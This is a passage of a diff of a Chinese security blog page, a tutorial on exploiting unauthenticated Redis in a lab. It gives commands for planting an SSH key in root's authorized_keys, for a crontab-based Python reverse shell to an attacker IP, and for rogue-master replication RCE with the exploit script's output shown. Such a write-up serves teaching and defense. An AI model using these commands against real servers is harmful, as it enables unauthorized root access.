+<h4 id="4-2-利用“公私钥”认证获取root权限"><a href="#4-2-利用“公私钥”认证获取root权限" class="headerlink" title="4.2 利用“公私钥”认证获取root权限"></a>4.2 利用“公私钥”认证获取root权限</h4><p>当redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。<br />靶机中开启redis服务：redis-server &#x2F;etc&#x2F;redis.conf<br />在靶机中执行  mkdir &#x2F;root&#x2F;.ssh  命令，创建ssh公钥存放目录（靶机是作为ssh服务器使用的）<br />在攻击机中生成ssh公钥和私钥，密码设置为空：<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis8.png"><br />进入.ssh目录：cd .ssh&#x2F;，将生成的公钥保存到1.txt：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; <span class="built_in">cat</span> id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/9.png"><br />链接靶机上的redis服务，<br />将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入)：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt | redis-cli -h 192.168.0.110 -x <span class="built_in">set</span> crack</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/10.png"></p>
+<p><br />远程登录靶机的redis服务：redis-cli -h 192.168.0.104 <br />并使用 CONFIG GET dir 命令得到redis备份的路径：<br />更改redis备份路径为ssh公钥存放目录（一般默认为&#x2F;root&#x2F;.ssh)<br />设置上传公钥的备份文件名字为authorized_keys：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config get <span class="built_in">dir</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/11.png"></p>
+<p><br />检查是否更改成功（查看有没有authorized_keys文件)，没有问题就保存然后退出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config get dbfilename</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/12.png"><br />至此成功写入ssh公钥到靶机<br />在攻击机上使用ssh免密登录靶机：ssh -i id_rsa <a href="mailto:&#114;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x30;&#46;&#x31;&#x31;&#48;">&#114;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x30;&#46;&#x31;&#x31;&#48;</a><br />成功登录<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/13.png"></p>
+<h4 id="4-3-利用Crontab反弹shell"><a href="#4-3-利用Crontab反弹shell" class="headerlink" title="4.3 利用Crontab反弹shell"></a>4.3 利用Crontab反弹shell</h4><p>在<strong>权限足够的情况</strong>下，利用redis写入文件到计划任务目录下执行。</p>
+<p>在攻击者服务器上监听一个端口（未被占用的任意端口）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 7777</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>攻击步骤</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.0.110</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> xxx  <span class="string">&quot;\n* * * * * /usr/bin/python -c &#x27;import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.0.111\&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><br /> <img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/14.png"><br /> <br />登陆ubuntu查看计划任务，已经成功写入。但是发现计划中存在乱码，也就是这些乱码导致计划任务执行错误。<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/15.png"></p>
+<p>这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，<br />因为自己如果不使用redis写任务计划文件，而是正常向&#x2F;etc&#x2F;cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。</p>
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/16.png"></p>
+<ul>
+<li><strong>解决办法（未完待续）</strong></li>
+</ul>
+<p>发现ubantu下默认使用&#x2F;bin&#x2F;dash执行脚本的问题，解决方式:将shell环境修改为bash。<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/17.png"></p>
+<h4 id="4-4-通过主从复制-GetShell"><a href="#4-4-通过主从复制-GetShell" class="headerlink" title="4.4 通过主从复制 GetShell"></a>4.4 通过主从复制 GetShell</h4><h5 id="4-4-1-redis主从复制"><a href="#4-4-1-redis主从复制" class="headerlink" title="4.4.1 redis主从复制"></a>4.4.1 redis主从复制</h5><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<p>这里我们开两台docker来做测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-1-7-ubuntu:~/lorexxar$ sudo docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">3fdb2479af9c        redis:5.0           &quot;docker-entrypoint.s…&quot;   22 hours ago        Up 4 seconds        0.0.0.0:6380-&gt;6379/tcp   epic_khorana</span><br><span class="line">3e313c7498c2        redis:5.0           &quot;docker-entrypoint.s…&quot;   23 hours ago        Up 23 hours         0.0.0.0:6379-&gt;6379/tcp   vibrant_hodgkin</span><br></pre></td></tr></table></figure>
+
+<p>然后通过slaveof可以设置主从状态</p>
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/18.png"><br />这样一来数据就会自动同步了</p>
+<h5 id="4-4-2-redis模块"><a href="#4-4-2-redis模块" class="headerlink" title="4.4.2 redis模块"></a>4.4.2 redis模块</h5><p>在了解了主从同步之后，我们还需要对redis的模块有所了解。<br />在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。<br />编写恶意so文件的代码<br /><a target="_blank" rel="noopener" href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p>
+<h5 id="4-4-3-利用原理"><a href="#4-4-3-利用原理" class="headerlink" title="4.4.3 利用原理"></a>4.4.3 利用原理</h5><p>Pavel Toporkov在2018年的zeronights会议上，分享了关于这个漏洞的详细原理。<br /><a target="_blank" rel="noopener" href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p>
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/19.png"></p>
+<h5 id="4-4-4-复现过程"><a href="#4-4-4-复现过程" class="headerlink" title="4.4.4 复现过程"></a>4.4.4 复现过程</h5><p>选择使用模拟的恶意服务端来作为主机，并模拟fullresync请求。</p>
+<ul>
+<li>第一个脚本</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a><br />然后直接通过脚本来攻击服务端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">──(root💀kali)-[~/mytools/new/redis-rogue-getshell]</span><br><span class="line">└─# ./redis-master.py -r 192.168.0.110 -p 6379 -L 192.168.0.111 -P 8888 -f RedisModulesSDK/exp.so -c &quot;id&quot;</span><br><span class="line">&gt;&gt; send data: b&#x27;*3\r\n$7\r\nSLAVEOF\r\n$13\r\n192.168.0.111\r\n$4\r\n8888\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;+OK\r\n&#x27;</span><br><span class="line">&gt;&gt; send data: b&#x27;*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;+OK\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;PING\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;REPLCONF listening-port 6379\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;REPLCONF capa eof capa psync2\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;PSYNC af12f81deb86c2f8397ae9077ea01eea50e506c1 1\r\n&#x27;</span><br><span class="line">&gt;&gt; send data: b&#x27;*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;+OK\r\n&#x27;</span><br><span class="line">&gt;&gt; send data: b&#x27;*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;+OK\r\n&#x27;</span><br><span class="line">&gt;&gt; send data: b&#x27;*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;+OK\r\n&#x27;</span><br><span class="line">&gt;&gt; send data: b&#x27;*2\r\n$11\r\nsystem.exec\r\n$2\r\nid\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;$49\r\neuid=999(redis) gid=999(redis) groups=999(redis)\n\r\n&#x27;</span><br><span class="line">euid=999(redis) gid=999(redis) groups=999(redis)</span><br><span class="line"></span><br><span class="line">&gt;&gt; send data: b&#x27;*3\r\n$6\r\nMODULE\r\n$6\r\nUNLOAD\r\n$6\r\nsystem\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;+OK\r\n&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第二个脚本</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a><br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/20.png"></p>
+<h2 id="三、参考"><a href="#三、参考" class="headerlink" title="三、参考"></a>三、参考</h2><p><a target="_blank" rel="noopener" href="https://lorexxar.cn/2019/07/10/redis-5-x-rce/">https://lorexxar.cn/2019/07/10/redis-5-x-rce/</a><br /><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/redis/4-unacc">https://github.com/vulhub/vulhub/tree/master/redis/4-unacc</a><br /><a target="_blank" rel="noopener" href="https://www.cnblogs.com/websec80/articles/14734623.html">https://www.cnblogs.com/websec80/articles/14734623.html</a><br /><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a><br /><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a><br /><a target="_blank" rel="noopener" href="https://blog.xray.cool/post/learning-redis-security">https://blog.xray.cool/post/learning-redis-security</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://suiyideali.github.io/2023/04/20/%E5%BC%80%E7%AB%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0ch4z">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Geek小黑板">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/20/%E5%BC%80%E7%AB%AF/" class="post-title-link" itemprop="url">开端</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-04-20 17:12:46 / 修改时间：17:30:44" itemprop="dateCreated datePublished" datetime="2023-04-20T17:12:46+08:00">2023-04-20</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Hello-blog"><a href="#Hello-blog" class="headerlink" title="Hello blog"></a>Hello blog</h1><p>很早之前就想搭建一个博客，写一点东西，后续博客更新内容如下：</p>
+<ul>
+<li>网络安全</li>
+<li>渗透测试</li>
+<li>甲方安全</li>
+<li>代码</li>
+<li>杂谈</li>
+<li>日常生活</li>
+</ul>
+<p>后续随缘更新…..</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
   </nav>
 
 
 
-              </div>
-            </div>
           </div>
-        </div>
-      </div>
-    
+          
 
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    </div>
-  
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
-</div>
-
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
       }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">m0ch4z</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">m0ch4z</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  <script defer src="/js/leancloud.js" ></script>
-
-  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+
+
+
+
+
+
+
+
 
 
   
 
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
+  
+
 </body>
 </html>
